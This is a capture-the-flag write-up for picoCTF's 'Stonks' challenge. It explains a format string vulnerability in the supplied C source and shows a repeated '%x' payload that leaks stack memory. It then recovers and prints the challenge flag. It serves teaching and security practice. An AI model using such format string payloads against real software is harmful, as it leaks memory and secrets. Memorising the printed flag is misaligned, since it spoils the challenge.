# Stonks

## Introduction

Stonks is the first challenge for Binary Exploitation. The description says: "I
decided to try something noone [sic] else has before. I made a bot to
automatically trade stonks for me using AI and machine learning. I wouldn't
believe you if you told me it's unsecure! vuln.c `nc mercury.picoctf.net 53437`"

![challenge](resources/challenge.png)

## Information Gathering

### Hint 1

> Okay, maybe I'd believe you if you find my API key.

Just one hint this time! Yikes! API stands for application programming
interface. It is used to refer to the standard that defines how two separate
component communicate with each other. Think of it like how you receive letter
grades in school. You hand in your papers and you receive a grade back. That
transaction represents an underlying API.

In this case, the API key is referring to an alphanumeric string that we can
provide this networked application that will tell it who we are. Consider it
like a password of sorts - it is unique to certain individuals or projects.

The hint is telling us to take a look at how the API key is read into the
program or maybe the API key is hardcoded to a certain value. We will have to
take a look!

### Running the Program

The description tells us how to run the program: `nc mercury.picoctf.net 53437`.
 The program `nc` is short for `netcat` and is used for all things
networking. With it, we can communicate to an existing socket, open our own, or
scan ports. Take a look at `man nc` to learn about all of it's common uses (it
even has great examples). `nc` typically takes a destination address and a port
as an argument. In this case, we are specifying that we would like to connect
to `mercury.picoctf.net` over port 53437 using the Transmission Control
Protocol (TCP).

Let's try doing this in our terminal:

```bash
$ nc mercury.picoctf.net 53437
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
```

We are met with a prompt asking for a 1 or 2 to perform certain actions. Other
characters don't seem to work. Entering `5` for example causes it to tell us
"Goodbye!".

Entering `1` prompts us for out API token:

```txt
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
```

Entering a short value here seems to work and give us a few stocks that were
purchased for us. This ends to program.

Running it again (you will have to terminate the program with Ctrl+C) and
choosing the second option shows us our portfolio and exits the program.

```txt
Portfolio as of Sun Aug  1 22:03:52 UTC 2021


You don't own any stonks!
Goodbye!
```

By playing with the program, we have identified two locations where a user can
provide input: selecting 1 or 2 (or really anything else) to select the command
and the API key. This is key to finding bugs! It's hard to get a bug where
there is no user input.

But there is more! In the description we were provided with the source code for
`vuln.c`. Let's take a look at some key parts (comments are my own).

```c
int main(int argc, char *argv[])
{
	setbuf(stdout, NULL); /* Information will be written to stdout as soon
as it is written. */
	srand(time(NULL)); /* Seed a random number. */
	Portfolio *p = initialize_portfolio(); /* Allocate some memory and set
some values. */
	if (!p) {
		printf("Memory failure\n");
		exit(1);
	}

	int resp = 0;

	printf("Welcome back to the trading app!\n\n");
	printf("What would you like to do?\n");
	printf("1) Buy some stonks!\n");
	printf("2) View my portfolio\n");
	scanf("%d", &resp); /* User input #1. Take text from stdin and convert
it to its integer representation. */

	if (resp == 1) {
		buy_stonks(p); /* This looks interesting! */
	} else if (resp == 2) {
		view_portfolio(p); /* This looks interesting! */
	}

	free_portfolio(p);
	printf("Goodbye!\n"); /* Free up our allocated memory. */

	exit(0);
}
```
I always like starting with `main`. Even without looking at the rest of the
code, it contextualizes a lot of what is going on and shows us some of the
paths that program takes. The above codeblock, in a nutshell, creates some
Portfolio structure, reads in user input, checks if it is a 1 or a 2, and calls
`buy_stonks` or `view_portfolio`. Okay, we don't see anything about flags here,
so maybe we should check out `buy_stonks`.

```c
int buy_stonks(Portfolio *p) {
	if (!p) { /* Check that this is initialized. */
		return 1;
	}
	char api_buf[FLAG_BUFFER]; */ Ooo, a static buffer of 128 bytes. */
	FILE *f = fopen("api","r"); /* Opening the flag file, this looks
promising. */
	if (!f) {
		printf("Flag file not found. Contact an admin.\n");
		exit(1);
	}
	fgets(api_buf, FLAG_BUFFER, f); /* Read 128 bytes from f and place them
into api_buf. */

	int money = p->money; /* This is a random number from 0-2018. */
	int shares = 0;
	Stonk *temp = NULL;
	printf("Using patented AI algorithms to buy stonks\n");
	while (money > 0) {
		shares = (rand() % money) + 1;
		temp = pick_symbol_with_AI(shares); /* Maybe look at this? */
		temp->next = p->head;
		p->head = temp;
		money -= shares;
	}
	printf("Stonks chosen\n");

	// TODO: Figure out how to read token from file, for now just ask

	char *user_buf = malloc(300 + 1);
	printf("What is your API token?\n");
	scanf("%300s", user_buf); /* User input #2. Get user input and make a
string of 300 characters. */
	printf("Buying stonks with token:\n");
	printf(user_buf); /* Bug alert! We are passing user controlled data
into this string formatter and aren't giving it the proper amount of arguments!
*/

	// TODO: Actually use key to interact with API

	view_portfolio(p);

	return 0;
}
```
Okay, so this code block looks really promising. It tells us that it is opening
and reading the flag and storing the value on the stack, but never actually
showing us. Later, we have a format string vulnerability where we control the
input. This is probably the key to this challenge.

A format string vulnerability occurs when the user input is evaluated by
functions such as `printf` or `sprintf` and there are unspecified amount of
format string parameters. If we consider the faulty line `printf(user_buf)`, we
can pass as user input a string such as `%s` and have the format function look
for a second argument on the stack (or registers, depending on your
architecture) and interpret it as a string. We can expand this further and walk
up the stack by providing *a lot* of format string parameters like
`%x%x%x%x%x%x%x%x%x%x%x`. When evaluated by the `printf` function, this user
input will request 11 values off the stack. Since the function didn't provide
any in the `printf` argument, we will be causing an out-of-bounds read off the
stack. Where is our flag stored? On the stack.

We try passing a bunch of format string parameters to the program:

```bash
What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
Buying stonks with token:
87c8430804b00080489c3f7f85d80ffffffff187c6160f7f93110f7f85dc7087c7180187c841087c84306f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e3463646261653532ffe8007d
Portfolio as of Sat Aug  7 19:11:23 UTC 2021
...
...
```

The program outputs the evaluated result from the `printf` call, and it most
definitely is not the API token we passed in. This is where it gets hand-wavey.
We can see that a lot of values look like ASCII hex (see `man ascii`). Search
Google for a hex to ASCII converter gave us this result:
![ascii](./resources/hex_to_ascii.png)

It definitely looks like there is a flag there, judging by the brackets. But
what's up, the bytes are jumbled? This is due to [endianess][wiki].
[RFC1700][rfc] declares that TCP/IP will use big-endian when encoding data to
send over the network. We need to encode it back to little-endian to get the
order right. pwntools provides the [packing][pwn] utility to do just that; we
can use the `p32` function (which is really just a wrapper to struct.pack, but
who ever remembers all the flags to that function anyway?) to pack the data as
little-endian. A little python scripting swaps the order for us and we get the
flag: `picoCTF{I_l05t_4ll_my_m0n3y_bdc425ea}`. This gives us 20 points!

[wiki]: https://en.wikipedia.org/wiki/Endianness
[rfc]: https://ieeexplore.ieee.org/document/1667115?arnumber=1667115
[pwn]: https://docs.pwntools.com/en/stable/util/packing.html
